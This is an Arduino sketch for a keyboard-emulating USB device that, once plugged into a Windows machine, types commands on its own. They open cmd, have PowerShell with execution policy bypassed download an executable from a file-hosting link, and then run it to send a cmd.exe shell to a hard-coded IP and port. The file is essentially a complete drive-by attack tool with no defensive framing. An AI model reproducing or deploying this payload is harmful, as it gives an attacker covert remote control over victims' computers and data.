#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();

  delay(1500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://1fichier.com/?6jls6tiohg' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");

  typeKey(KEY_RETURN);

  delay(50);

  Keyboard.print("START /MIN a.exe 139.59.30.32 8080 -e cmd.exe -d & exit");

  typeKey(KEY_RETURN);

  Keyboard.end();
}
void loop() {}
